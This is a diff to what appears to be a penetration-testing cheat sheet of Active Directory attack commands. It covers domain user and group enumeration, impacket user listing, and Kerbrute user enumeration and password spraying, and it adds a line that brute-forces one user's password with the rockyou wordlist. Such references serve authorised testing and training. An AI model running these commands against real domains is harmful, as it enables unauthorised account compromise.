@@ -627,10 +627,10 @@ net user {USERNAME} /domain
 # Enumerate all groups in domain
 net group /domain
 
-# Kerbrute
+# Kerbrute Brute Force
 sudo /opt/kerbrute/kerbrute userenum -d {DOMAIN} --dc {IP ADDRESS}  {user.txt}  
 sudo /opt/kerbrute/kerbrute passwordspray -d {DOMAIN} --dc {IP ADDRESS}  {user.txt} {passwords.txt}
-
+sudo /opt/kerbrute/kerbrute bruteuser -d {DOMAIN} --dc {IP ADDRESS} /usr/share/wordlists/rockyou.txt {USER}
 
 # Get active directory users
 python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS}
